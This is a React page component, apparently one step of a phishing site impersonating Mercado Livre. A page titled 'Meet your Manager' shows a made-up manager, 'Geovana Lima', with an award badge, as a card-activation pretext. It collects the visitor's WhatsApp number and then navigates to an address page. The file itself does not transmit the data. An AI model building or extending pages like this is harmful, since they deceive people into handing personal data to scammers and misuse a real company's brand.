import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import gerente from "@/assets/gerente-geovana.png";

export const Route = createFileRoute("/gerente")({
  head: () => ({
    meta: [
      { title: "Conheça sua Gerente - Mercado Livre" },
      { name: "description", content: "Sua gerente irá auxiliar na ativação do seu cartão." },
    ],
  }),
  component: Gerente,
});

function Gerente() {
  const navigate = useNavigate();
  const [whatsapp, setWhatsapp] = useState("");

  const formatPhone = (v: string) => {
    const d = v.replace(/\D/g, "").slice(0, 11);
    if (d.length <= 2) return d;
    if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
    return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (whatsapp.replace(/\D/g, "").length < 10) return;
    navigate({ to: "/endereco" });
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <div className="bg-[#FFE600] w-full h-3" />

      <main className="flex-1 flex items-start justify-center px-4 py-6">
        <div className="w-full max-w-md bg-white rounded-xl shadow-sm p-6 md:p-8">
          <h1 className="text-2xl font-bold text-gray-800 text-center mb-3">
            Ótimo, quase lá!
          </h1>
          <p className="text-sm text-gray-600 text-center mb-6 leading-relaxed">
            Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
          </p>

          <div className="relative bg-gradient-to-b from-[#EAF1FF] to-white border border-blue-100 rounded-xl p-6 mb-6">
            <svg className="absolute top-4 left-4 w-5 h-5 text-gray-900" viewBox="0 0 24 24" fill="currentColor">
              <path d="M6 17h3l2-4V7H5v6h3l-2 4zm8 0h3l2-4V7h-6v6h3l-2 4z" />
            </svg>

            <div className="flex flex-col items-center">
              <div className="w-32 h-32 rounded-full p-1 bg-gradient-to-br from-[#FFE600] to-[#1d5fc4] mb-3">
                <div className="w-full h-full rounded-full overflow-hidden bg-white">
                  <img src={gerente} alt="Gerente Geovana Lima" className="w-full h-full object-cover" />
                </div>
              </div>
              <div className="text-xs text-gray-500">Gerente</div>
              <div className="text-lg font-bold text-gray-800 mb-3">Geovana Lima</div>
              <div className="inline-flex items-center gap-2 bg-gradient-to-r from-[#FFE600] to-[#1d5fc4] text-white text-xs font-semibold py-1.5 px-4 rounded-full shadow">
                🏆 Melhor gerente 2023-2025
              </div>
            </div>
          </div>

          <form onSubmit={handleSubmit}>
            <div className="flex items-center gap-2 border-b-2 border-[#FFE600] pb-2 mb-6">
              <div className="w-7 h-7 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
                <svg viewBox="0 0 24 24" className="w-4 h-4 text-white" fill="currentColor">
                  <path d="M.057 24l1.687-6.163a11.867 11.867 0 0 1-1.587-5.946C.16 5.335 5.495 0 12.05 0a11.817 11.817 0 0 1 8.413 3.488 11.824 11.824 0 0 1 3.48 8.414c-.003 6.557-5.338 11.892-11.893 11.892a11.9 11.9 0 0 1-5.688-1.448L.057 24zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/>
                </svg>
              </div>
              <input
                type="tel"
                value={whatsapp}
                onChange={(e) => setWhatsapp(formatPhone(e.target.value))}
                placeholder="Digite seu WhatsApp"
                className="flex-1 outline-none text-gray-800 placeholder:text-gray-400 bg-transparent text-sm"
              />
            </div>

            <button
              type="submit"
              className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 font-bold py-4 rounded-lg shadow-md transition-colors"
            >
              Continuar
            </button>
          </form>
        </div>
      </main>
    </div>
  );
}
